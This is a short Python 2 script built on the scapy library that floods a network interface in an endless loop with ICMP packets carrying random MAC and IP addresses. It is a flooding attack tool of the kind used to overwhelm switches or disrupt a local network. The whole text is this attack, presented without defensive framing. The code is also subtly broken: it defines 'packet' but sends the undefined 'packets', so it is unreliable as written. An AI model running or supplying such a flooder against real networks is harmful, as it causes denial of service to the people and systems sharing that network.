import sys
from scapy.all import *   

packet = Ether(src=RandMAC("*:*:*:*:*:*"),dst=RandMAC("*:*:*:*:*:*"))/IP(src=RandIP("*.*.*.*"),dst=RandIP("*.*.*.*"))/ICMP()

#Flag1=src.dst
if len(sys.argv) < 2:
    dev = "eth0"
else:
    dev = sys.argv[1]    

print "Flooding net with random packets on dev " + dev    

sendp(packets, iface=dev, loop=1)
